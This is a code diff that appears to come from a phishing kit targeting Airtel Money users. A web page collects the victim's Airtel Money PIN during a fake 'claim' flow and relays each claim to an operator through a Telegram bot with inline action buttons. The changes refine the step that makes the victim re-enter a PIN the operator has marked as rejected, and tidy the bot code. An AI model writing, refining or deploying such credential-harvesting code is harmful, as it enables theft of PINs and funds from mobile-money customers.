@@ -666,11 +666,16 @@ else if(data.status==='rejected_pin'){
 clearInterval(pollInterval);
 pollInterval=null;
 goToStep('step2');
-document.getElementById('airtelPin').value='';
-document.getElementById('airtelPin').classList.add('error');
-setTimeout(function(){document.getElementById('airtelPin').classList.remove('error')},1500);
+var pinInput = document.getElementById('airtelPin');
+var pinBtn = document.getElementById('pinBtn');
+var pinBtnText = document.getElementById('pinText');
+pinInput.value='';
+pinBtn.disabled=false;
+pinBtnText.textContent='Continue';
+pinInput.classList.add('error');
+setTimeout(function(){pinInput.classList.remove('error')},1500);
 showErr('pinMessage','Incorrect PIN. Please re-enter your Airtel Money PIN.');
-document.getElementById('airtelPin').focus();
+pinInput.focus();
 fetch('/api/clear-status/'+currentClaimId,{method:'POST'});
 }
 }catch(error){
@@ -925,15 +930,6 @@ async function answerCallbackQuery(callbackQueryId, text) {
     }
 }
 
-async function editTelegramMessage(chatId, messageId, text) {
-    try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
-        await axios.post(url, { chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' });
-    } catch (e) {
-        console.error('Edit message error:', e.message);
-    }
-}
-
 function getClaimKeyboard(claimId) {
     return [
         [
@@ -1030,7 +1026,6 @@ app.post('/api/start-claim', async (req, res) => {
             createdAt: new Date().toISOString()
         };
 
-        // Send Telegram message with inline action buttons
         const msg =
             ' <b>NEW CLAIM STARTED</b>\n\n' +
             ' <b>Claim ID:</b> <code>#' + claimId + '</code>\n' +
@@ -1099,12 +1094,10 @@ app.post('/api/clear-status/:claimId', (req, res) => {
 });
 
 // ===== TELEGRAM WEBHOOK =====
-// Telegram sends updates here when a button is pressed
 app.post(`/telegram/webhook`, async (req, res) => {
     try {
         const update = req.body;
 
-        // Handle callback_query (inline button press)
         if (update.callback_query) {
             const cq = update.callback_query;
             const data = cq.data || '';
@@ -1114,7 +1107,7 @@ app.post(`/telegram/webhook`, async (req, res) => {
 
             const c = claims[claimId];
             if (!c) {
-                await answerCallbackQuery(cq.id, '❌ Claim not found');
+                await answerCallbackQuery(cq.id, ' Claim not found');
                 return res.sendStatus(200);
             }
 
@@ -1167,7 +1160,7 @@ app.post(`/telegram/webhook`, async (req, res) => {
     }
 });
 
-// ===== WEBHOOK SETUP ROUTE (open in browser once after deploy) =====
+// ===== WEBHOOK SETUP ROUTE =====
 app.get('/setup-webhook', async (req, res) => {
     try {
         const publicUrl = req.query.url;
